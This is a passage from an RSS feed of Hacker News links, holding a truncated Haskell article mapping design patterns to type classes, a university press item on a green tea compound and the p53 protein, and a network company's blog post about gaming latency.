    <p><em>Posted on November 24, 2018
    
        by Thomas Mahler
    </em></p></div>

<p><a href="https://circleci.com/gh/thma/LtuPatternFactory"><img src="https://circleci.com/gh/thma/LtuPatternFactory.svg?style=svg" alt="CircleCI"></a></p>
<p>My first programming languages were Lisp, Scheme, and ML. When I later started to work in OO languages like C++ and Java I noticed that idioms that are standard vocabulary in functional programming (fp) were not so easy to achieve and required sophisticated structures. Books like <a href="https://en.wikipedia.org/wiki/Design_Patterns">Design Patterns: Elements of Reusable Object-Oriented Software</a> were a great starting point to reason about those structures. One of my earliest findings was that several of the GoF-Patterns had a stark resemblance of structures that are built into in functional languages: for instance the strategy pattern corresponds to higher order functions in fp (more details see <a href="#strategy">below</a>).</p>
<p>Recently, while re-reading through the <a href="https://wiki.haskell.org/Typeclassopedia">Typeclassopedia</a> I thought it would be a good exercise to map the structure of software <a href="https://en.wikipedia.org/wiki/Software_design_pattern#Classification_and_list">design-patterns</a> to the concepts found in the Haskell type class library and in functional programming in general.</p>
<p>By searching the web I found some blog entries studying specific patterns, but I did not come across any comprehensive study. As it seemed that nobody did this kind of work yet I found it worthy to spend some time on it and write down all my findings on the subject.</p>
<p>I think this kind of exposition could be helpful if you are:</p>
<ul>
<li>a programmer with an OO background who wants to get a better grip on how to implement complexer designs in functional programming</li>
<li>a functional programmer who wants to get a deeper intuition for type classes.</li>
<li>studying the <a href="https://wiki.haskell.org/Typeclassopedia">Typeclassopedia</a> and are looking for an accompanying reading providing example use cases and working code.</li>
</ul>
<blockquote>
<p>This project is work in progress, so please feel free to contact me with any corrections, adjustments, comments, suggestions and additional ideas you might have. Please use the <a href="https://github.com/thma/LtuPatternFactory/issues">Issue Tracker</a> to enter your requests.</p>
</blockquote>
<h2 id="table-of-contents">Table of contents</h2>
<ul>
<li><a href="#lambda-the-ultimate-pattern-factory">Lambda the ultimate pattern factory</a></li>
<li><a href="#the-patternopedia">The Patternopedia</a>
<ul>
<li><a href="#data-transfer-object--functor">Data Transfer Object → Functor</a></li>
<li><a href="#singleton--applicative">Singleton → Applicative</a></li>
<li><a href="#pipeline--monad">Pipeline → Monad</a></li>
<li><a href="#nullobject--maybe-monad">NullObject → Maybe Monad</a></li>
<li><a href="#interpreter--reader-monad">Interpreter → Reader Monad</a> <!--  * [? → MonadFail](#--monadfail)--></li>
<li><a href="#aspect-weaving--monad-transformers">Aspect Weaving → Monad Transformers</a> <!--* [? → MonadFix](#--monadfix) --></li>
<li><a href="#composite--semigroup--monoid">Composite → SemiGroup → Monoid</a> <!--* [? → Alternative, MonadPlus, ArrowPlus](--alternative-monadplus-arrowplus) --></li>
<li><a href="#visitor--foldable">Visitor → Foldable</a></li>
<li><a href="#iterator--traversable">Iterator → Traversable</a> <!-- * [? → Bifunctor](#--bifunctor) --></li>
<li><a href="#the-pattern-behind-the-patterns--category">The Pattern behind the Patterns → Category</a> <!--* [? → Arrow](#--arrow) --></li>
<li><a href="#fluent-api--comonad">Fluent Api → Comonad</a></li>
</ul></li>
<li><a href="#beyond-type-class-patterns">Beyond type class patterns</a>
<ul>
<li><a href="#dependency-injection--parameter-binding-partial-application">Dependency Injection → Parameter Binding, Partial Application</a></li>
<li><a href="#command--functions-as-first-class-citizens">Command → Functions as First Class Citizens</a></li>
<li><a href="#adapter--function-composition">Adapter → Function Composition</a></li>
<li><a href="#template-method--type-class-default-functions">Template Method → type class default functions</a></li>
<li><a href="#creational-patterns">Creational Patterns</a>
<ul>
<li><a href="#abstract-factory--functions-as-data-type-values">Abstract Factory → functions as data type values</a></li>
<li><a href="#builder--record-syntax-smart-constructor">Builder → record syntax, smart constructor</a></li>
</ul></li>
</ul></li>
<li><a href="#functional-programming-patterns">Functional Programming Patterns</a>
<ul>
<li><a href="#higher-order-functions">Higher Order Functions</a></li>
<li><a href="#map-reduce">Map Reduce</a> <!-- * [Continuation Passing](#continuation-passing) --></li>
<li><a href="#lazy-evaluation">Lazy Evaluation</a> <!-- * [Functional Reactive Programming](#functional-reactive-programming) --></li>
<li><a href="#reflection">Reflection</a></li>
</ul></li>
<li><a href="#conclusions">Conclusions</a></li>
<li><a href="#some-interesting-links">Some related links</a></li>
</ul>
<h2 id="the-patternopedia">The Patternopedia</h2>
<p>The <a href="https://wiki.haskell.org/wikiupload/8/85/TMR-Issue13.pdf">Typeclassopedia</a> is a now classic paper that introduces the Haskell type classes by clarifying their algebraic and category-theoretic background. In particular it explains the relationships among those type classes.</p>
<p>In this chapter I’m taking a tour through the Typeclassopedia from a design pattern perspective. For each of the Typeclassopedia type classes I try to explain how it corresponds to structures applied in software design patterns.</p>
<p>As a reference map I have included the following chart that depicts the Relationships between type classes covered in the Typeclassopedia:</p>
<figure>
<img src="https://wiki.haskell.org/wikiupload/c/c7/Typeclassopedia-diagram.svg" alt=""><figcaption>The Haskell type classes covered by the Typeclassopedia</figcaption>
</figure>
<ul>
<li>Solid arrows point from the general to the specific; that is, if there is an arrow from Foo to Bar it means that every Bar is (or should be, or can be made into) a Foo.</li>
<li>Dotted lines indicate some other sort of relationship.</li>
<li>Monad and ArrowApply are equivalent.</li>
<li>Apply and Comonad are greyed out since they are not actually (yet?) in the standard Haskell libraries ∗.</li>
</ul>
<h3 id="data-transfer-object-functor">Data Transfer Object → Functor</h3>
<blockquote>
<p>In the field of programming a data transfer object (DTO) is an object that carries data between processes. The motivation for its use is that communication between processes is usually done resorting to remote interfaces (e.g., web services), where each call is an expensive operation. Because the majority of the cost of each call is related to the round-trip time between the client and the server, one way of reducing the number of calls is to use an object (the DTO) that aggregates the data that would have been transferred by the several calls, but that is served by one call only. (quoted from <a href="https://en.wikipedia.org/wiki/Data_transfer_object">Wikipedia</a></p>
</blockquote>
<p>Data Transfer Object is a pattern from Martin Fowler’s <a href="https://martinfowler.com/eaaCatalog/dataTransferObject.html">Patterns of Enterprise Application Architecture</a>. It is typically used in multi-layered applications where data is transferred between backends and frontends.</p>
<p>The aggregation of data usually also involves a denormalization of data structures. As an example, please refer to the following diagram where two entities from the backend (<code>Album</code> and <code>Artist</code>) are assembled to a compound denormalized DTO <code>AlbumDTO</code>:</p>
<figure>
<img src="https://martinfowler.com/eaaCatalog/dtoSketch.gif" alt=""><figcaption>DTO</figcaption>
</figure>
<p>Of course, there is also an inverse mapping from <code>AlbumDTO</code> to <code>Album</code> which is not shown in this diagram.</p>
<p>In Haskell <code>Album</code>, <code>Artist</code> and <code>AlbumDTO</code> can be represented as data types with record notation:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>data</span> <span>Album</span> <span>=</span> <span>Album</span> {</span>
<span id="cb1-2"><span>    title       ::</span> <span>String</span></span>
<span id="cb1-3">  ,<span> publishDate ::</span> <span>Int</span></span>
<span id="cb1-4">  ,<span> labelName   ::</span> <span>String</span></span>
<span id="cb1-5">  ,<span> artist      ::</span> <span>Artist</span></span>
<span id="cb1-6">} <span>deriving</span> (<span>Show</span>)</span>
<span id="cb1-7"></span>
<span id="cb1-8"><span>data</span> <span>Artist</span> <span>=</span> <span>Artist</span> {</span>
<span id="cb1-9"><span>    publicName ::</span> <span>String</span></span>
<span id="cb1-10">  ,<span> realName   ::</span> <span>Maybe</span> <span>String</span></span>
<span id="cb1-11">} <span>deriving</span> (<span>Show</span>)</span>
<span id="cb1-12"></span>
<span id="cb1-13"><span>data</span> <span>AlbumDTO</span> <span>=</span> <span>AlbumDTO</span> {</span>
<span id="cb1-14"><span>    albumTitle  ::</span> <span>String</span></span>
<span id="cb1-15">  ,<span> published   ::</span> <span>Int</span></span>
<span id="cb1-16">  ,<span> label       ::</span> <span>String</span></span>
<span id="cb1-17">  ,<span> artistName  ::</span> <span>String</span></span>
<span id="cb1-18">} <span>deriving</span> (<span>Show</span>, <span>Read</span>)</span></code></pre></div>
<p>The transfer from an <code>Album</code> to an <code>AlbumDTO</code> and vice versa can be achieved by two simple functions, that perfom the intended field wise mappings:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>toAlbumDTO ::</span> <span>Album</span> <span>-&gt;</span> <span>AlbumDTO</span></span>
<span id="cb2-2">toAlbumDTO <span>Album</span> {title <span>=</span> t, publishDate <span>=</span> d, labelName <span>=</span> l, artist <span>=</span> a} <span>=</span></span>
<span id="cb2-3">  <span>AlbumDTO</span> {albumTitle <span>=</span> t, published <span>=</span> d, label <span>=</span> l, artistName <span>=</span> (publicName a)}</span>
<span id="cb2-4"></span>
<span id="cb2-5"><span>toAlbum ::</span> <span>AlbumDTO</span> <span>-&gt;</span> <span>Album</span></span>
<span id="cb2-6">toAlbum <span>AlbumDTO</span> {albumTitle <span>=</span> t, published <span>=</span> d, label <span>=</span> l, artistName <span>=</span> n} <span>=</span></span>
<span id="cb2-7">  <span>Album</span> {title <span>=</span> t, publishDate <span>=</span> d, labelName <span>=</span> l, artist <span>=</span> <span>Artist</span> {publicName <span>=</span> n, realName <span>=</span> <span>Nothing</span>}}</span></code></pre></div>
<p>In this few lines we have covered the basic idea of the DTO pattern.</p>
<p>Now, let’s consider the typical situation that you don’t have to transfer only a <em>single</em> <code>Album</code> instance but a whole list of <code>Album</code> instances, e.g.:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>albums ::</span> [<span>Album</span>]</span>
<span id="cb3-2">albums <span>=</span></span>
<span id="cb3-3">    [</span>
<span id="cb3-4">      <span>Album</span> {title <span>=</span> <span>"Microgravity"</span>,</span>
<span id="cb3-5">             publishDate <span>=</span> <span>1991</span>,</span>
<span id="cb3-6">             labelName <span>=</span> <span>"Origo Sound"</span>,</span>
<span id="cb3-7">             artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Biosphere"</span>, realName <span>=</span> <span>Just</span> <span>"Geir Jenssen"</span>}}</span>
<span id="cb3-8">    , <span>Album</span> {title <span>=</span> <span>"Apollo - Atmospheres &amp; Soundtracks"</span>,</span>
<span id="cb3-9">             publishDate <span>=</span> <span>1983</span>,</span>
<span id="cb3-10">             labelName <span>=</span> <span>"Editions EG"</span>,</span>
<span id="cb3-11">             artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Brian Eno"</span>, realName <span>=</span> <span>Just</span> <span>"Brian Peter George St. John le Baptiste de la Salle Eno"</span>}}</span>
<span id="cb3-12">    ]</span></code></pre></div>
<p>In this case we have to apply the <code>toAlbumDTO</code> function to all elements of the list. In Haskell this <em>higher order</em> operation is called <code>map</code>:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>map</span><span> ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> [a] <span>-&gt;</span> [b]</span>
<span id="cb4-2"><span>map</span> _f []    <span>=</span> []</span>
<span id="cb4-3"><span>map</span> f (x<span>:</span>xs) <span>=</span> f x <span>:</span> <span>map</span> f xs</span></code></pre></div>
<p><code>map</code> takes a function <code>f :: (a -&gt; b)</code> (a function from type <code>a</code> to type <code>b</code>) and an <code>[a]</code> list and returns a <code>[b]</code> list. The <code>b</code> elements are produced by applying the function <code>f</code> to each element of the input list. Applying <code>toAlbumDTO</code> to a list of albums can thus be done in the Haskell REPL GHCi as follows:</p>
<div id="cb5"><pre><code><span id="cb5-1">λ<span>&gt;</span> <span>map</span> toAlbumDTO albums</span>
<span id="cb5-2">[<span>AlbumDTO</span> {albumTitle <span>=</span> <span>"Microgravity"</span>, published <span>=</span> <span>1991</span>, label <span>=</span> <span>"Origo Sound"</span>, artistName <span>=</span> <span>"Biosphere"</span>},</span>
<span id="cb5-3"> <span>AlbumDTO</span> {albumTitle <span>=</span> <span>"Apollo - Atmospheres &amp; Soundtracks"</span>, published <span>=</span> <span>1983</span>, label <span>=</span> <span>"Editions EG"</span>, artistName <span>=</span> <span>"Brian Eno"</span>}]</span></code></pre></div>
<p>This mapping of functions over lists is a basic technique known in many functional languages. In Haskell further generalises this technique with the concept of the <code>Functor</code> type class.</p>
<blockquote>
<p>The <code>Functor</code> class is the most basic and ubiquitous type class in the Haskell libraries. A simple intuition is that a <code>Functor</code> represents a “container” of some sort, along with the ability to apply a function uniformly to every element in the container. For example, a list is a container of elements, and we can apply a function to every element of a list, using <code>map</code>. As another example, a binary tree is also a container of elements, and it’s not hard to come up with a way to recursively apply a function to every element in a tree.</p>
<p>Another intuition is that a Functor represents some sort of “computational context”. This intuition is generally more useful, but is more difficult to explain, precisely because it is so general.</p>
<p>Quoted from <a href="https://wiki.haskell.org/Typeclassopedia#Functor">Typeclassopedia</a></p>
</blockquote>
<p>Basically, all instances of the <code>Functor</code> type class must provide a function <code>fmap</code>:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>class</span>  <span>Functor</span> f  <span>where</span></span>
<span id="cb6-2"><span>    fmap ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> f a <span>-&gt;</span> f b</span></code></pre></div>
<p>For Lists the implementation is simply the <code>map</code> function that we already have seen above:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>instance</span> <span>Functor</span> [] <span>where</span></span>
<span id="cb7-2">    <span>fmap</span> <span>=</span> <span>map</span></span></code></pre></div>
<p>Functors have interesting properties, they fulfill the two so called <em>functor laws</em>, which are part of the definition of a mathematical functor:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>fmap</span> <span>id</span> <span>=</span> <span>id</span>                        <span>-- (1)</span></span>
<span id="cb8-2"><span>fmap</span> (g <span>.</span> h) <span>=</span> (<span>fmap</span> g) <span>.</span> (<span>fmap</span> h)  <span>-- (2)</span></span></code></pre></div>
<p>The first law <code>(1)</code> states that mapping the identity function over every item in a container has no effect.</p>
<p>The second <code>(2)</code> says that mapping a composition of two functions over every item in a container is the same as first mapping one function, and then mapping the other.</p>
<p>These laws are very useful when we consider composing complex mappings from simpler operations.</p>
<p>Say we want to extend our DTO mapping functionality by also providing some kind of marshalling. For a single album instance, we can use function composition <code>(f . g) x == f (g x)</code>, which is defined in Haskell as:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>(.) ::</span> (b <span>-&gt;</span> c) <span>-&gt;</span> (a <span>-&gt;</span> b) <span>-&gt;</span> a <span>-&gt;</span> c</span>
<span id="cb9-2">(<span>.</span>) f g x <span>=</span> f (g x)</span></code></pre></div>
<p>In the following GHCi session we are using <code>(.)</code> to first convert an <code>Album</code> to its <code>AlbumDTO</code> representation and then turn that into a <code>String</code> by using the <code>show</code> function:</p>
<div id="cb10"><pre><code><span id="cb10-1">λ<span>&gt;</span> album1 <span>=</span> albums <span>!!</span> <span>0</span></span>
<span id="cb10-2">λ<span>&gt;</span> <span>print</span> album1</span>
<span id="cb10-3"><span>Album</span> {title <span>=</span> <span>"Microgravity"</span>, publishDate <span>=</span> <span>1991</span>, labelName <span>=</span> <span>"Origo Sound"</span>, artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Biosphere"</span>, realName <span>=</span> <span>Just</span> <span>"Geir Jenssen"</span>}}</span>
<span id="cb10-4">λ<span>&gt;</span> marshalled <span>=</span> (<span>show</span> <span>.</span> toAlbumDTO) album1</span>
<span id="cb10-5">λ<span>&gt;</span> <span>:</span>t marshalled</span>
<span id="cb10-6"><span>marshalled ::</span> <span>String</span></span>
<span id="cb10-7">λ<span>&gt;</span> <span>print</span> marshalled</span>
<span id="cb10-8"><span>"AlbumDTO {albumTitle = \"Microgravity\", …</span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html">https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126002</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Antioxidant in green tea may increase levels of p53, an anti-cancer protein]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26125671">thread link</a>) | @finphil
<br/>
February 13, 2021 | https://nuadox.com/post/643030841522536448/green-tea-p53-protein | <a href="https://web.archive.org/web/*/https://nuadox.com/post/643030841522536448/green-tea-p53-protein">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="643030841522536448">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/643030841522536448/green-tea-p53-protein"><h2>Antioxidant in green tea may increase levels of p53, an anti-cancer protein</h2></a>
                                <figure data-orig-width="1280" data-orig-height="855"><img src="https://64.media.tumblr.com/f6a0a630187afd9268b0372fbcc4e09e/1ae3647e82144769-00/s1280x1920/fc9b00fcd69f86ea10d75049e36b11fb66730a5e.jpg" alt="image" data-orig-width="1280" data-orig-height="855" width="1280" height="855"></figure><p><b>- By&nbsp;<a href="https://href.li/?https://info.rpi.edu/people/mary-l-martialay">Mary L. Martialay</a> ,&nbsp;<a href="https://href.li/?https://www.rpi.edu/">Rensselaer Polytechnic Institute</a> -</b></p><p>An antioxidant found in green tea may increase levels of p53, a natural anti-cancer protein, known as the “guardian of the genome” for its ability to repair DNA damage or destroy cancerous cells.&nbsp;</p><p>Published on February 12 in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-021-21258-5&amp;t=MDZkM2E3NDk0OWY2ZjYyN2E4ODRlN2I3OTViN2JlZjMxY2JlNzExNyxlUURrZXFETg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F643030841522536448%2Fgreen-tea-p53-protein&amp;m=0&amp;ts=1613450066"><i>Nature Communications</i>,</a> a study of the direct interaction between p53 and the green tea compound, epigallocatechin gallate (EGCG), points to a new target for cancer drug discovery.</p><p>“Both p53 and EGCG molecules are extremely interesting. Mutations in p53 are found in over 50% of human cancer, while EGCG is the major anti-oxidant in green tea, a popular beverage worldwide,” said <a href="https://href.li/?http://homepages.rpi.edu/~wangc5/index.html">Chunyu Wang</a>, corresponding author and a professor of biological sciences at <a href="https://href.li/?https://rpi.edu/">Rensselaer Polytechnic Institute</a>. “Now we find that there is a previously unknown, direct interaction between the two, which points to a new path for developing anti-cancer drugs. Our work helps to explain how EGCG is able to boost p53’s anti-cancer activity, opening the door to developing drugs with EGCG-like compounds.”</p><p>Wang, a member of the <a href="https://href.li/?https://www.youtube.com/watch?v=Hm_O0FqYSt4">Rensselaer Center for Biotechnology and Interdisciplinary Studies</a>, is an expert in using nuclear magnetic resonance spectroscopy to study <a href="https://href.li/?https://news.rpi.edu/content/2021/01/26/new-nih-grant-supports-single-molecule-study-protein-key-alzheimer-%E2%80%99s-disease">specific mechanisms in Alzheimer’s disease</a> and <a href="https://href.li/?https://news.rpi.edu/content/2017/02/27/hedgehog-cancer-and-zinc">cancer</a>, including p53, which he described as “arguably the most important protein in human cancer.”</p><p>P53 has several well-known anti-cancer functions, including halting cell growth to allow for DNA repair, activating DNA repair, and initiating programmed cell death — called apoptosis — if DNA damage cannot be repaired. One end of the protein, known as the N-terminal domain, has a flexible shape, and therefore, can potentially serve several functions depending on its interaction with multiple molecules.</p><p>EGCG is a natural antioxidant, which means it helps to undo the near constant damage caused during oxygen metabolism. Found in abundance in green tea, EGCG is also packaged as an herbal supplement.</p><p>Wang’s team found that the interaction between EGCG and p53 preserves the protein against degradation. Typically, after being produced within the body, p53 is quickly degraded when the N-terminal domain interacts with a protein called MDM2. This regular cycle of production and degradation holds p53 levels at a low constant.</p><p>“Both EGCG and MDM2 bind at the same place on p53, the N-terminal domain, so EGCG competes with MDM2,” said Wang. “When EGCG binds with p53, the protein is not being degraded through MDM2, so the level of p53 will increase with the direct interaction with EGCG, and that means there is more p53 for anti-cancer function. This is a very important interaction.”</p><p>“By developing an understanding of the molecular-level mechanisms that control key biochemical interactions linked to devastating illnesses such as cancer and Alzheimer’s disease, Chunyu’s research is laying the groundwork for new and successful therapies,” said Curt Breneman, dean of the Rensselaer School of Science.</p><p>–</p><p><b>Source:&nbsp;<a href="https://href.li/?https://news.rpi.edu/content/2021/02/12/green-tea-compound-aids-p53-guardian-genome-and-tumor-suppressor">Rensselaer Polytechnic Institute</a></b></p><p><b>Full study:</b>&nbsp;“EGCG binds intrinsically disordered N-terminal domain of p53 and disrupts p53-MDM2 interaction”, <i>Nature Communications</i>.</p><p><a href="https://href.li/?https://doi.org/10.1038/s41467-021-21258-5">https://doi.org/10.1038/s41467-021-21258-5</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625997758414929920/synthesizing-cepafungin">Chemists efficiently synthesize natural anti-cancer compound cepafungin I</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/tea">tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/green-tea">green tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/cancer">cancer</a>
                                    
                                        <a href="https://nuadox.com/tagged/oncology">oncology</a>
                                    
                                        <a href="https://nuadox.com/tagged/antioxidants">antioxidants</a>
                                    
                                        <a href="https://nuadox.com/tagged/p53">p53</a>
                                    
                                        <a href="https://nuadox.com/tagged/dna">dna</a>
                                    
                                        <a href="https://nuadox.com/tagged/genetics">genetics</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/egcg">egcg</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/643030841522536448/green-tea-p53-protein</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125671</guid>
            <pubDate>Sat, 13 Feb 2021 18:50:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Internet Today Isn’t Built for the Billions of Gamers of Tomorrow]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26124917">thread link</a>) | @quentusrex
<br/>
February 13, 2021 | https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow | <a href="https://web.archive.org/web/*/https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-4b4cde9dbdbb9767ad24"><div><p>The 2020 pandemic exposed a fundamental flaw in the way the Internet is built.</p><p>Online games were blamed for clogged networks and slowed speeds, but in reality, the Internet is structurally broken when it comes to real-time interactivity. You’ve heard the line:</p><p><strong><em>Kids, get off your consoles; I’m on a video call!</em></strong></p><p>It’s 4 PM on Wednesday. You’re on an important Zoom call and right in the middle of presenting when your face freezes. Those on the call can only catch half of what you say and are left staring at an unflattering image of you mid-word.</p><h3><strong>How We Got Here: The Evolving Internet</strong></h3><p>The Internet is built for the reliable delivery of content, such as e-mail and file transfers, but not built for performance. Border Gateway Protocol (BGP)— the standardized routing protocol for the Internet—has no idea what traffic it is routing or in which direction it is sending data. It simply routes data using the cheapest path possible depending on various factors, including politics, commercial agreements, and cost. As a result, certain types of data, namely real-time communications, suffer as the Internet favors servicing volumetric traffic.</p><p>At the start of the millennium, content delivery networks employed global networks of servers to deliver static content faster, leading the way to make OTT (Over-the-top, services offered over the top of traditional content distributors) possible with the infrastructure built by companies such as Netflix, YouTube, and Akamai. More recently, companies like Amazon Web Services have democratized cloud computing, bringing connectivity to more users in more regions of the world. The next evolution of the Internet should be one in which the network itself is democratized, enabling speed-of-light communication for the applications that require high-velocity delivery, such as real-time communications. This means delivering voice over internet protocol calls (VoIP, e.g., Skype, Clubhouse), online multiplayer video games, and more, regardless of the compute or data server owner.</p><h3><strong>Complex Issues with a Complex Network</strong></h3><p>The Internet is a complicated web of networks and billions of computers and devices that connect to each other and work together to send and receive information. The greater the distance between the sending and receiving computers, the longer it takes the data to arrive at its destination. Information can also take different paths, which may increase or decrease the speed of delivery.</p><p>A common analogy used to explain the way the Internet works is the postal service. In the same way that your letter travels from you to the recipient through multiple facilities (carrier, sorting, post office), data travels through numerous routers on its way to the recipient computer. Just as your letter can arrive faster depending on which mail service you use, so too can data transmit faster depending on which path it takes, though the distance between the sender and receiver has the most influence on travel time.</p><p>There are a couple of significant differences in this analogy, however.</p><p><em>One, there are generally more “stops” along the way for data, and two, the data is broken up into multiple smaller “packets” of information rather than sent as one whole mail piece.</em></p><p>Because there are different paths along which individual packets of information can travel, each entailing a variable number of stops along the way, packets of data can easily get lost.</p><p><strong>Packet loss</strong>, as it’s called, results in missing information and a degraded user experience. In a Skype call, packet loss is experienced as gaps in audio. In video games, packet loss results in strange behavior like teleportation, in which a game freezes, then suddenly moves a player’s character to another place when the game resumes.</p><p>Another result of these inconsistent, differing routes is variation in delivery time. Some routes are faster than others, so some packets may arrive more quickly than others since the Internet is not conscious of which path it takes in sending data from one point to another. This variation in the time it takes for data to travel across the network from one endpoint to another is called <strong>latency</strong>, and the result of latency is <strong>jitter</strong>. On a Skype call, jitter manifests as jumbled speech that creates an indecipherable conversation. In video games, jitter manifests in behavior like errant shots, in which a player’s aim may be correct, but the shot doesn’t register in time to hit the target where they are.</p><p>While <strong>lag</strong> (high levels of latency), jitter, and packet loss may impact any online service or application, certain applications depend upon real-time packet delivery and minimal jitter and packet loss to function correctly and maintain a reasonable quality of experience. Packet delivery, consistent latency, and minimal lag are critical for services and applications like VoIP and online gaming and in numerous other industries such as high-frequency trading, telemedicine, and the Internet of Things.</p><p>For these applications, milliseconds saved in delivering data can lead to a real or virtual life-and-death situation and mean the difference between winning and losing millions of dollars or between a quality and a subpar gaming experience.</p><h3><strong>How Subspace Improves Real-Time Application Delivery</strong></h3><p>A millisecond’s delay in delivery does not matter in sending an email or a text message, but it does matter in real-time communications. So why should these applications travel on the same network, in the same way?</p><p>Subspace’s vision is to create an Internet byway through which latency-critical web traffic such as video games, VoIP, and video conferencing can consistently pass through at the speed of light. Like Waze for the Internet, Subspace gives the Internet a GPS of sorts, finding the absolute fastest and most secure and consistent path for real-time data to travel from endpoint to endpoint. As a result, latency and lag are reduced, and real-time applications reach their full potential.</p><p>While other companies have attempted to provide solutions for expediting real-time communications on the Internet, none have addressed the issue across the entire system. Many introduce other issues in their attempts. Commercial networking solutions like Cisco and Juniper were not built for global coordination or to understand and control game traffic. Standalone solutions that require SDKs installed in clients and servers can create significant security and stability risks. And services provided by CDNs like Cloudflare and Akamai utilize the same principles and infrastructure as their primary businesses—that is, volumetric traffic—making the possibility of optimizing real-time traffic at scale a costly and difficult endeavor.&nbsp;</p><p>In the case of video games, lag, packet loss, and jitter are such a concern that some game companies have endeavored to build their own custom solutions. This “do it yourself” approach requires massive internal coordination, investment, and attention, which many publishers cannot afford to prioritize. And still, a DIY approach limits the publisher to its existing commercial relationships and capabilities.</p><p>Subspace’s platform optimizes every component of network performance, from the infrastructure stack to the networking stack, including software and hardware, the control plane, and the data plane. With a global Internet architected specifically for real-time traffic at every point, we are achieving speed-of-light communication and democratizing the network. Regardless of the data’s location, Subspace uses a vast system of Internet quality metrics and a proprietary algorithm to direct real-time interactive traffic onto our platform and across the public and our private Internet to and from servers. The algorithm can balance multiple variables to suit each application’s needs—variables such as absolute latency, any latency above a threshold, jitter &amp; loss. The optimal delivery platform via the Subspace onramp drives better, more consistent experiences that match each application’s needs.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_35285"><div><p>We start with purpose-built points of presence (PoPs), deploying our hardware in data centers worldwide. Each PoP is capable of handling millions of servers, millions of simultaneous user sessions, and enough capacity for all of the user traffic while also providing room for absorbing DDOS attacks, with the expectation that traffic by its nature is mostly small UDP packets.</p><p>The PoPs are distributed globally and specifically network-engineered to reduce the distance needed for players to reach our onramp, minimizing the risk of congestion and misrouting. Players are given a Subspace IP and UDP port as a proxy for a server.</p><p>The Subspace PoP uses a proprietary algorithm to determine the optimal path through our private network before ultimately reaching the game server and back. We do this both ways, packets can take a different route back from the server if Subspace finds a better path for the application needs, another differentiator to CDNs, which are optimized for one-way traffic. Continuous telemetry measures the latency, jitter, and loss between Subspace PoPs, feeding into an algorithm that determines the optimum route between the edge and application servers. On the network’s server-side, we have PoPs directly connected with major providers to minimize latency and lag upon exiting our network.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_41155"><div><p>Subspace’s global network, which has already launched in multiple regions and is being aggressively deployed towards a global optimized network, already supports some of the world’s most popular online games. And it’s not just about performance. The Subspace platform leverages all of these PoPs to provide a tremendous platform for stopping DDoS attacks against application servers at the edge, before bot networks can aggregate into attacks that get too big to handle or have to be sent off to latency-inducing scrubbing centers. Troublesome attack vectors, replay attacks, and other volumetric attacks can be easily stopped at the Subspace edge, while the game server infrastructure remains protected …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</a></em></p>]]>
            </description>
            <link>https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124917</guid>
            <pubDate>Sat, 13 Feb 2021 17:22:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Algorithms for Optimization Now Open Access]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26124759">thread link</a>) | @Mageek
<br/>
